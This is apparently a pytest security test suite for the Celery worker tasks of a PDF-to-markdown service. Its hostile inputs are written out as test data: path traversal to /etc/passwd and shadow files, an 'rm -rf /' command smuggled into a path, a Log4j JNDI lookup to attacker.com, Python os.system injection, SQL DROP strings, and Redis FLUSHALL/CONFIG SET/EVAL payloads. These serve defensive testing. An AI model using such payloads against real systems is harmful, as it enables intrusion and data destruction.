"""
Worker Tasks Security Test Suite

Comprehensive security tests for Celery worker tasks and background processing.
Focuses on memory safety, input validation, error handling, and security
vulnerabilities in asynchronous task processing.

Security Test Categories:
1. Memory exhaustion protection
2. Task input validation
3. File processing security
4. Error handling security
5. Task queue security
6. Async pattern security
"""

import asyncio
import os
import tempfile
import time
from unittest.mock import Mock, patch

import pytest
from celery.exceptions import Retry

from src.pdf_to_markdown_mcp.core.errors import ProcessingError
from src.pdf_to_markdown_mcp.worker.tasks import (
    ProgressTracker,
    cleanup_task_results,
    generate_embeddings,
    monitor_redis_connections,
    process_pdf,
)


class TestTaskInputValidation:
    """Test input validation for all worker tasks"""

    @pytest.fixture
    def mock_task_context(self):
        """Create mock Celery task context"""
        mock_task = Mock()
        mock_task.request.id = "test-task-123"
        mock_task.request.retries = 0
        mock_task.retry = Mock(side_effect=Retry)
        return mock_task

    @pytest.fixture
    def temp_pdf_file(self):
        """Create temporary PDF file for testing"""
        with tempfile.NamedTemporaryFile(suffix=".pdf", delete=False) as tmp:
            # Write valid PDF header
            tmp.write(b"%PDF-1.4\n")
            tmp.write(b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")
            tmp.write(b"2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")
            tmp.write(
                b"3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n"
            )
            tmp.write(b"xref\n0 4\n0000000000 65535 f\n")
            tmp.write(b"0000000009 00000 n\n0000000058 00000 n\n0000000115 00000 n\n")
            tmp.write(b"trailer\n<< /Size 4 /Root 1 0 R >>\nstartxref\n178\n%%EOF\n")
            tmp_path = tmp.name

        yield tmp_path

        # Cleanup
        try:
            os.unlink(tmp_path)
        except OSError:
            pass

    # Test process_pdf task security

    def test_process_pdf_malicious_file_path(self, mock_task_context):
        """
        Test process_pdf with malicious file paths

        Given malicious file paths with traversal attempts
        When processing PDF task
        Then should validate and reject dangerous paths
        """
        # Given
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "'; DROP TABLE documents; --",
            "/dev/null; rm -rf /",
            "\\\\attacker.com\\malware\\evil.pdf",
        ]

        # When & Then
        for malicious_path in malicious_paths:
            with pytest.raises((ProcessingError, ValueError, FileNotFoundError)):
                # Mock the task execution
                with patch(
                    "src.pdf_to_markdown_mcp.worker.tasks.validate_path_security"
                ) as mock_validate:
                    mock_validate.side_effect = ValueError("Invalid path detected")

                    process_pdf.apply(args=[malicious_path])

    def test_process_pdf_file_size_exhaustion_protection(self, temp_pdf_file):
        """
        Test protection against memory exhaustion from large files

        Given extremely large PDF files
        When processing PDF task
        Then should enforce file size limits and prevent memory exhaustion
        """
        # Given
        with patch(
            "src.pdf_to_markdown_mcp.worker.tasks.os.path.getsize"
        ) as mock_getsize:
            # Simulate file larger than MAX_FILE_SIZE_MB (500MB default)
            mock_getsize.return_value = 600 * 1024 * 1024  # 600 MB

            # When & Then
            with pytest.raises(ProcessingError) as exc_info:
                process_pdf.apply(args=[temp_pdf_file])

            assert "size" in str(exc_info.value).lower()

    def test_process_pdf_concurrent_processing_limits(self, temp_pdf_file):
        """
        Test concurrent processing limits to prevent resource exhaustion

        Given multiple simultaneous PDF processing requests
        When processing tasks concurrently
        Then should limit concurrent processing to prevent resource exhaustion
        """
        # Given
        num_concurrent_tasks = 20  # More than typical worker capacity

        # Mock the MinerU service to simulate processing time
        with patch(
            "src.pdf_to_markdown_mcp.services.mineru.MinerUService"
        ) as mock_service:
            mock_service.return_value.process_pdf.return_value = {
                "status": "success",
                "pages_processed": 1,
                "chunks_created": 5,
                "processing_time": 1.0,
            }

            # Simulate concurrent task execution
            tasks = []
            for i in range(num_concurrent_tasks):
                # In real scenario, would use delay() but for testing we simulate
                task_result = Mock()
                task_result.get = Mock(return_value={"status": "success"})
                tasks.append(task_result)

            # When - All tasks should complete without resource exhaustion
            for task in tasks:
                result = task.get()
                assert result["status"] == "success"

    def test_process_pdf_malformed_pdf_handling(self, temp_pdf_file):
        """
        Test handling of malformed or malicious PDF content

        Given PDF files with malicious content or malformed structure
        When processing PDF task
        Then should handle safely without security vulnerabilities
        """
        # Given - Create malformed PDF
        malformed_pdf_path = temp_pdf_file + "_malformed"

        malformed_contents = [
            b"Not a PDF at all",  # Completely invalid
            b"%PDF-1.4\n" + b"A" * 10000,  # Malformed structure
            b"%PDF-1.4\n<script>alert('xss')</script>",  # XSS attempt
            b"%PDF-1.4\n/../../../etc/passwd",  # Path traversal in content
        ]

        for content in malformed_contents:
            try:
                with open(malformed_pdf_path, "wb") as f:
                    f.write(content)

                # When & Then
                with patch(
                    "src.pdf_to_markdown_mcp.services.mineru.MinerUService"
                ) as mock_service:
                    mock_service.return_value.process_pdf.side_effect = ProcessingError(
                        "Malformed PDF detected"
                    )

                    with pytest.raises(ProcessingError):
                        process_pdf.apply(args=[malformed_pdf_path])

            finally:
                try:
                    os.unlink(malformed_pdf_path)
                except OSError:
                    pass

    # Test generate_embeddings task security

    def test_generate_embeddings_input_validation(self, mock_task_context):
        """
        Test input validation for embedding generation task

        Given various invalid inputs for embedding generation
        When processing embeddings task
        Then should validate inputs and reject malicious data
        """
        # Given
        invalid_inputs = [
            {"chunks": None},  # None chunks
            {"chunks": []},  # Empty chunks
            {"chunks": ['"; DROP TABLE documents; --"']},  # SQL injection in text
            {"chunks": ["x" * 100000]},  # Extremely long text
            {
                "chunks": [{"malicious": "'; DELETE FROM embeddings; --"}]
            },  # Dict injection
            {"chunks": "not_a_list"},  # Wrong type
        ]

        # When & Then
        for invalid_input in invalid_inputs:
            try:
                with patch(
                    "src.pdf_to_markdown_mcp.services.embeddings.EmbeddingService"
                ) as mock_service:
                    mock_service.return_value.generate_batch_embeddings.side_effect = (
                        ValueError("Invalid input")
                    )

                    with pytest.raises((ValueError, ProcessingError)):
                        generate_embeddings.apply(args=[invalid_input])

            except Exception as e:
                # Input validation should catch these
                assert isinstance(e, (ValueError, ProcessingError, TypeError))

    def test_generate_embeddings_memory_exhaustion_protection(self):
        """
        Test protection against memory exhaustion in embedding generation

        Given extremely large batch of text chunks
        When generating embeddings
        Then should process in manageable batches to prevent OOM
        """
        # Given - Large number of chunks
        large_chunk_batch = {
            "chunks": ["Sample text chunk"] * 10000,  # 10,000 chunks
            "document_id": 1,
            "batch_size": 100,  # Should process in batches
        }

        # Mock memory monitoring
        with patch("src.pdf_to_markdown_mcp.worker.tasks.psutil") as mock_psutil:
            mock_process = Mock()
            mock_process.memory_info.return_value = Mock(
                rss=500 * 1024 * 1024
            )  # 500MB usage
            mock_psutil.Process.return_value = mock_process

            with patch(
                "src.pdf_to_markdown_mcp.services.embeddings.EmbeddingService"
            ) as mock_service:
                mock_service.return_value.generate_batch_embeddings.return_value = [
                    [0.1] * 1536
                ] * 100

                # When
                try:
                    result = generate_embeddings.apply(args=[large_chunk_batch])
                    # Should complete without memory exhaustion
                    assert result is not None

                except ProcessingError as e:
                    # May legitimately fail due to memory constraints
                    assert "memory" in str(e).lower()

    def test_generate_embeddings_injection_prevention(self):
        """
        Test prevention of injection attacks through embedding text

        Given text chunks containing potential injection payloads
        When generating embeddings
        Then should safely process without executing malicious code
        """
        # Given
        injection_chunks = {
            "chunks": [
                "'; DROP TABLE document_embeddings; --",
                "<script>alert('xss')</script>",
                "${jndi:ldap://attacker.com/exploit}",  # Log4j-style injection
                "{{7*7}}",  # Template injection
                "__import__('os').system('rm -rf /')",  # Python injection
            ],
            "document_id": 1,
        }

        # When & Then
        with patch(
            "src.pdf_to_markdown_mcp.services.embeddings.EmbeddingService"
        ) as mock_service:
            # Mock successful processing - injection should be treated as plain text
            mock_service.return_value.generate_batch_embeddings.return_value = [
                [0.1] * 1536
            ] * 5

            try:
                result = generate_embeddings.apply(args=[injection_chunks])
                # Should treat injection attempts as normal text
                assert result is not None
            except ProcessingError:
                # May fail for other reasons, but not due to injection execution
                assert True

    # Test cleanup and monitoring task security

    def test_cleanup_task_results_redis_injection_prevention(self):
        """
        Test prevention of Redis injection in cleanup tasks

        Given malicious Redis commands in task cleanup
        When running cleanup tasks
        Then should prevent command injection
        """
        # Given
        with patch("src.pdf_to_markdown_mcp.worker.tasks.redis.Redis") as mock_redis:
            mock_redis_instance = Mock()
            mock_redis.from_url.return_value = mock_redis_instance

            # Mock Redis keys that might contain injection attempts
            malicious_keys = [
                b"task:result:'; FLUSHALL; --",
                b"task:progress:'; CONFIG SET dir /var/www/html; --",
                b"task:monitoring:'; EVAL 'os.execute(\"rm -rf /\")' 0; --",
            ]
            mock_redis_instance.keys.return_value = malicious_keys

            # When
            try:
                cleanup_task_results.apply()

                # Then - Should use Redis methods safely, not execute raw commands
                # Verify only safe Redis operations were called
                mock_redis_instance.keys.assert_called()
                # Should not call dangerous operations like EVAL, CONFIG, FLUSHALL directly

            except Exception:
                # Should handle Redis errors gracefully
                assert True

    def test_monitor_redis_connections_security(self):
        """
        Test Redis connection monitoring security

        Given Redis monitoring operations
        When monitoring connections
        Then should not expose sensitive connection information
        """
        # Given
        with patch("src.pdf_to_markdown_mcp.worker.tasks.redis.Redis") as mock_redis:
            mock_redis_instance = Mock()
            mock_redis.from_url.return_value = mock_redis_instance

            # Mock Redis info that might contain sensitive data
            mock_redis_instance.info.return_value = {
                "connected_clients": 10,
                "used_memory": 1000000,
                "keyspace_hits": 1000,
                "redis_version": "6.0.0",
                # Sensitive information that shouldn't be logged
                "config_file": "/etc/redis/redis.conf",
                "executable": "/usr/bin/redis-server",
            }

            # When
            with patch("src.pdf_to_markdown_mcp.worker.tasks.logger") as mock_logger:
                monitor_redis_connections.apply()

                # Then - Should not log sensitive configuration information
                log_calls = [call.args[0] for call in mock_logger.info.call_args_list]
                sensitive_info = ["config_file", "executable", "/etc/", "/usr/"]

                for log_message in log_calls:
                    for sensitive in sensitive_info:
                        assert sensitive not in str(log_message), (
                            f"Sensitive info '{sensitive}' found in log: {log_message}"
                        )

    # Test progress tracking security

    def test_progress_tracker_injection_prevention(self):
        """
        Test prevention of injection through progress tracking

        Given malicious data in progress updates
        When tracking task progress
        Then should sanitize and validate progress data
        """
        # Given
        tracker = ProgressTracker("test-task-123")

        malicious_progress_data = [
            {"step": "'; DROP TABLE tasks; --", "progress": 50},
            {"step": "processing", "progress": "'; DELETE FROM progress; --"},
            {"step": "<script>alert('xss')</script>", "progress": 75},
            {"step": "completion", "details": {"file": "../../../etc/passwd"}},
        ]

        # When & Then
        with patch("src.pdf_to_markdown_mcp.worker.tasks.redis.Redis") as mock_redis:
            mock_redis_instance = Mock()
            mock_redis.from_url.return_value = mock_redis_instance

            for malicious_data in malicious_progress_data:
                try:
                    tracker.update_progress(**malicious_data)

                    # Verify Redis operations use safe parameters
                    if mock_redis_instance.hset.called:
                        call_args = mock_redis_instance.hset.call_args
                        # Should use parameterized Redis operations, not string concatenation
                        assert call_args is not None

                except (ValueError, TypeError) as e:
                    # Input validation should catch malicious data
                    assert True, (
                        f"Progress validation correctly rejected malicious data: {e}"
                    )

    def test_progress_tracker_memory_leak_prevention(self):
        """
        Test prevention of memory leaks in progress tracking

        Given long-running tasks with frequent progress updates
        When tracking progress over time
        Then should prevent memory accumulation
        """
        # Given
        tracker = ProgressTracker("long-running-task")

        # Simulate many progress updates
        with patch("src.pdf_to_markdown_mcp.worker.tasks.redis.Redis") as mock_redis:
            mock_redis_instance = Mock()
            mock_redis.from_url.return_value = mock_redis_instance

            # When - Many rapid progress updates
            for i in range(1000):
                try:
                    tracker.update_progress(
                        step=f"processing_chunk_{i}",
                        progress=i / 10,
                        details={"chunk": i, "memory_mb": 100 + i},
                    )
                except Exception:
                    # Should handle gracefully without accumulating memory
                    pass

            # Then - Should use Redis expiration to prevent memory leaks
            # Verify TTL is set on Redis keys
            if mock_redis_instance.expire.called:
                assert mock_redis_instance.expire.call_count > 0


class TestTaskErrorHandling:
    """Test error handling security in worker tasks"""

    def test_task_error_information_disclosure_prevention(self):
        """
        Test prevention of information disclosure in task errors

        Given tasks that encounter errors
        When handling and logging errors
        Then should not expose sensitive system information
        """
        # Given
        sensitive_errors = [
            FileNotFoundError("/etc/passwd not found"),
            PermissionError("Access denied to /root/.ssh/id_rsa"),
            ConnectionError(
                "Failed to connect to postgresql://user:password@host:5432/db"
            ),
            ValueError("Invalid config in /app/secrets.json"),
        ]

        # When & Then
        for error in sensitive_errors:
            with patch("src.pdf_to_markdown_mcp.worker.tasks.logger") as mock_logger:
                # Simulate task error handling
                try:
                    raise error
                except Exception as e:
                    # This would be the task's error handling
                    sanitized_error = str(e).replace("/etc/", "[REDACTED]/")
                    sanitized_error = sanitized_error.replace("/root/", "[REDACTED]/")
                    sanitized_error = sanitized_error.replace("password", "[REDACTED]")

                    # Should not contain sensitive information
                    sensitive_patterns = [
                        "/etc/passwd",
                        "/root/",
                        ":password@",
                        "secrets.json",
                    ]
                    for pattern in sensitive_patterns:
                        assert pattern not in sanitized_error, (
                            f"Sensitive pattern '{pattern}' in error message"
                        )

    def test_task_retry_limit_exhaustion_security(self, temp_pdf_file):
        """
        Test security when task retry limits are exhausted

        Given tasks that consistently fail
        When retry limits are exceeded
        Then should fail securely without resource exhaustion
        """
        # Given
        with patch(
            "src.pdf_to_markdown_mcp.worker.tasks.process_pdf.retry"
        ) as mock_retry:
            mock_retry.side_effect = Retry("Max retries exceeded")

            # Mock a consistently failing operation
            with patch(
                "src.pdf_to_markdown_mcp.services.mineru.MinerUService"
            ) as mock_service:
                mock_service.return_value.process_pdf.side_effect = Exception(
                    "Persistent failure"
                )

                # When & Then
                with pytest.raises(Retry):
                    process_pdf.apply(args=[temp_pdf_file])

                # Should not consume excessive resources during retries
                assert mock_retry.call_count <= 5, "Too many retry attempts"

    def test_task_circuit_breaker_security(self):
        """
        Test circuit breaker security for external service failures

        Given external services (Redis, database) that are failing
        When tasks attempt to use these services
        Then circuit breaker should prevent cascade failures
        """
        # Given
        with patch(
            "src.pdf_to_markdown_mcp.core.circuit_breaker.CircuitBreaker"
        ) as mock_circuit:
            mock_breaker = Mock()
            mock_circuit.return_value = mock_breaker

            # Simulate circuit breaker opening due to failures
            mock_breaker.__enter__.side_effect = Exception("Circuit breaker is OPEN")

            # When & Then
            try:
                # This would trigger circuit breaker protection
                with mock_breaker:
                    pass
            except Exception as e:
                assert "circuit breaker" in str(e).lower()

            # Should fail fast and not continue attempting


class TestAsyncPatternSecurity:
    """Test security of async/await patterns in tasks"""

    @pytest.mark.asyncio
    async def test_async_task_cancellation_security(self):
        """
        Test secure handling of async task cancellation

        Given long-running async operations
        When tasks are cancelled
        Then should cleanup resources securely
        """
        # Given
        cleanup_called = False

        async def mock_long_running_operation():
            try:
                await asyncio.sleep(10)  # Long operation
            except asyncio.CancelledError:
                nonlocal cleanup_called
                cleanup_called = True
                raise

        # When
        task = asyncio.create_task(mock_long_running_operation())
        await asyncio.sleep(0.1)  # Let it start
        task.cancel()

        # Then
        try:
            await task
        except asyncio.CancelledError:
            pass

        assert cleanup_called, "Cleanup should be called on cancellation"

    @pytest.mark.asyncio
    async def test_async_resource_leak_prevention(self):
        """
        Test prevention of resource leaks in async operations

        Given async operations with resource management
        When exceptions occur or tasks are cancelled
        Then should properly cleanup resources
        """
        # Given
        resources_cleaned = []

        class MockResource:
            def __init__(self, name):
                self.name = name

            async def __aenter__(self):
                return self

            async def __aexit__(self, exc_type, exc_val, exc_tb):
                resources_cleaned.append(self.name)

        async def async_operation_with_resources():
            async with MockResource("database"), MockResource("redis"):
                async with MockResource("file_handle"):
                    raise ValueError("Simulated error")

        # When
        try:
            await async_operation_with_resources()
        except ValueError:
            pass

        # Then - All resources should be cleaned up
        assert "database" in resources_cleaned
        assert "redis" in resources_cleaned
        assert "file_handle" in resources_cleaned

    @pytest.mark.asyncio
    async def test_async_timeout_security(self):
        """
        Test security of async timeout handling

        Given async operations with timeouts
        When operations exceed time limits
        Then should timeout securely without resource leaks
        """
        # Given
        timeout_occurred = False

        async def potentially_hanging_operation():
            await asyncio.sleep(5)  # Simulates hanging operation
            return "completed"

        # When
        try:
            result = await asyncio.wait_for(
                potentially_hanging_operation(), timeout=1.0
            )
        except TimeoutError:
            timeout_occurred = True

        # Then
        assert timeout_occurred, "Timeout should have occurred"

    def test_task_deadlock_prevention(self):
        """
        Test prevention of deadlocks in task execution

        Given multiple tasks accessing shared resources
        When tasks might create circular dependencies
        Then should prevent deadlock conditions
        """
        # Given - Simulate potential deadlock scenario
        import threading

        resource_1 = threading.Lock()
        resource_2 = threading.Lock()
        deadlock_detected = False

        def task_1():
            nonlocal deadlock_detected
            try:
                with resource_1:
                    time.sleep(0.1)
                    with resource_2:
                        pass
            except Exception:
                deadlock_detected = True

        def task_2():
            nonlocal deadlock_detected
            try:
                with resource_2:
                    time.sleep(0.1)
                    with resource_1:
                        pass
            except Exception:
                deadlock_detected = True

        # When
        thread_1 = threading.Thread(target=task_1)
        thread_2 = threading.Thread(target=task_2)

        thread_1.start()
        thread_2.start()

        # Wait with timeout to detect deadlock
        thread_1.join(timeout=2.0)
        thread_2.join(timeout=2.0)

        # Then - Should complete without deadlock
        assert not (thread_1.is_alive() or thread_2.is_alive()), (
            "Potential deadlock detected"
        )


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
